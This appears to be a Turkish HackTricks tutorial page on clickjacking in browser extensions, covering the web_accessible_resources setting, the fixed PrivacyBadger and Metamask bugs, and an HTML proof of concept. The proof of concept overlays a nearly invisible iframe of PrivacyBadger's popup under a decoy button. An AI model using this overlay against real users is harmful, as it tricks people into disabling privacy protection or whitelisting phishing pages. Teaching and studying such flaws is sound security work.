# BrowExt - ClickJacking

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahramanla öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamınızı görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**'ı takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR göndererek paylaşın**.

</details>

## Temel Bilgiler

Bu sayfa, bir Tarayıcı eklentisindeki ClickJacking zafiyetini istismar edecektir.\
ClickJacking nedir bilmiyorsanız, şu adrese bakın:

{% content-ref url="../clickjacking.md" %}
[clickjacking.md](../clickjacking.md)
{% endcontent-ref %}

Uzantılar, **`manifest.json`** adlı bir dosyayı içerir ve bu JSON dosyasında **`web_accessible_resources`** alanı bulunur. İşte [Chrome belgelerinde](https://developer.chrome.com/extensions/manifest/web\_accessible\_resources) bununla ilgili söylenenler:

> Bu kaynaklar, **`chrome-extension://[PAKET KİMLİĞİ]/[YOL]`** URL'si aracılığıyla bir web sayfasında kullanılabilir hale gelir ve bu URL, **`extension.getURL`** yöntemiyle oluşturulabilir. İzin verilen kaynaklar, uygun CORS başlıklarıyla sunulduğundan, XHR gibi mekanizmalar aracılığıyla kullanılabilir.[1](https://blog.lizzie.io/clickjacking-privacy-badger.html#fn.1)

Tarayıcı uzantısındaki **`web_accessible_resources`**, sadece web üzerinden erişilebilir olmakla kalmaz, aynı zamanda uzantının doğal yetkileriyle çalışır. Bu, şunları yapabilme yeteneğine sahip oldukları anlamına gelir:

- Uzantının durumunu değiştirme
- Ek kaynaklar yükleme
- Tarayıcıyla belirli bir ölçüde etkileşimde bulunma

Ancak, bu özellik bir güvenlik riski oluşturur. **`web_accessible_resources`** içindeki bir kaynak önemli bir işlevselliğe sahipse, saldırgan bu kaynağı harici bir web sayfasına gömebilir. Bu sayfayı ziyaret eden dikkatsiz kullanıcılar, bu gömülü kaynağı yanlışlıkla etkinleştirebilir. Uzantının kaynaklarının izinleri ve yeteneklerine bağlı olarak, bu etkinleştirme istenmeyen sonuçlara yol açabilir.

## PrivacyBadger Örneği

PrivacyBadger uzantısında, `skin/` dizininin aşağıdaki şekilde **`web_accessible_resources`** olarak bildirildiği bir zafiyet tespit edildi (Orijinal [blog yazısına](https://blog.lizzie.io/clickjacking-privacy-badger.html) bakın):
```json
"web_accessible_resources": [
"skin/*",
"icons/*"
]
```
Bu yapılandırma potansiyel bir güvenlik sorununa yol açtı. Özellikle tarayıcıdaki PrivacyBadger simgesiyle etkileşim sonucu oluşturulan `skin/popup.html` dosyası, bir `iframe` içine yerleştirilebilir. Bu yerleştirme, kullanıcıları "Bu Web Sitesi için PrivacyBadger'ı Devre Dışı Bırak" seçeneğine yanlışlıkla tıklamaya kandırmak için istismar edilebilir. Bu eylem, kullanıcının gizliliğini tehlikeye atarak PrivacyBadger korumasını devre dışı bırakır ve kullanıcıyı artan takibe maruz bırakabilir. Bu saldırının görsel bir örneği, [**https://blog.lizzie.io/clickjacking-privacy-badger/badger-fade.webm**](https://blog.lizzie.io/clickjacking-privacy-badger/badger-fade.webm) adresindeki ClickJacking video örneğinde görülebilir.

Bu zafiyeti gidermek için basit bir çözüm uygulandı: `web_accessible_resources` listesinden `/skin/*` kaldırıldı. Bu değişiklik, `skin/` dizininin web erişilebilir kaynaklar aracılığıyla erişilemez veya manipüle edilemez olmasını sağlayarak riski etkin bir şekilde azalttı.

Düzeltme kolaydı: **`web_accessible_resources` içinden `/skin/*` kaldırıldı**.

### PoC
```html
<!--https://blog.lizzie.io/clickjacking-privacy-badger.html-->

<style>
iframe {
width: 430px;
height: 300px;
opacity: 0.01;
float: top;
position: absolute;
}

#stuff {
float: top;
position: absolute;
}

button {
float: top;
position: absolute;
top: 168px;
left: 100px;
}

</style>

<div id="stuff">
<h1>
Click the button
</h1>
<button id="button">
click me
</button>
</div>

<iframe src="chrome-extension://ablpimhddhnaldgkfbpafchflffallca/skin/popup.html">
</iframe>
```
## Metamask Örneği

[**Metamask'ta bir ClickJacking hakkında bir blog yazısı burada bulunabilir**](https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9). Bu durumda, Metamask, erişim için kullanılan protokolün **`https:`** veya **`http:`** olduğunu kontrol ederek (örneğin **`chrome:`** değil):

<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

Metamask uzantısında başka bir ClickJacking hatası da düzeltildi. Kullanıcılar, bir sayfanın dolandırıcılık olabileceği şüphesiyle karşılaştığında **Tıklama ile beyaz listeye ekleme** yapabiliyorlardı. Çünkü `“web_accessible_resources”: [“inpage.js”, “phishing.html”]` ifadesi nedeniyle bu sayfa Clickjacking'e karşı savunmasızdı. Bir saldırgan, kurbanın fark etmeden beyaz listeye eklemek için normal bir şey göstererek onu kullanabilirdi ve ardından beyaz listeye alınan sahte sayfaya geri dönebilirdi.

## Steam Inventory Helper Örneği

Bir tarayıcı uzantısındaki bir **XSS** ile bir **ClickJacking** açığı nasıl birleştirildiğini kontrol etmek için aşağıdaki sayfaya bakın:

{% content-ref url="browext-xss-example.md" %}
[browext-xss-example.md](browext-xss-example.md)
{% endcontent-ref %}

## Referanslar

* [https://blog.lizzie.io/clickjacking-privacy-badger.html](https://blog.lizzie.io/clickjacking-privacy-badger.html)
* [https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9](https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9)

<details>

<summary><strong>AWS hackleme konusunda sıfırdan kahramana dönüşmek için</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>'ı öğrenin!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklamınızı görmek veya HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARINA**](https://github.com/sponsors/carlospolop) göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz olan [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**'da takip edin.**
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına PR göndererek paylaşın.

</details>
